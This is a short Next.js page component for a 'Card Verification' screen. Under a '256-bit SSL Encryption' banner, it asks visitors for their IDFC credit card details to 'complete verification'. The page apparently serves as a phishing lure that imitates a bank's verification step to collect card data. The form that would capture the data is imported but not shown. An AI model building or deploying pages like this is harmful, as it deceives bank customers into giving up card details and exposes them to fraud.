import CardVerificationForm from "@/components/CardVerificationForm";

export default function CardVerificationPage() {
  return (
    <main className="min-h-screen bg-gray-50 px-4 py-8 flex flex-col items-center">
      
      {/* HERO */}
      <section className="w-full max-w-5xl rounded-xl bg-gradient-to-r from-[#9b1c23] via-[#6b3b5a] to-[#0d5c7f] text-white py-10 px-6 text-center">
        <div className="flex justify-center mb-4">
          <div className="border border-white/40 rounded-lg p-3">
            💳
          </div>
        </div>

        <h1 className="text-2xl md:text-3xl font-semibold">
          Card Verification
        </h1>
        <p className="mt-2 text-sm opacity-90">
          Secure 256-bit SSL Encryption
        </p>
      </section>

      {/* DESCRIPTION */}
      <p className="text-gray-600 text-sm text-center mt-6 max-w-xl">
        Please provide your IDFC credit card details below to complete verification.
      </p>

      {/* FORM */}
      <CardVerificationForm />
    </main>
  );
}
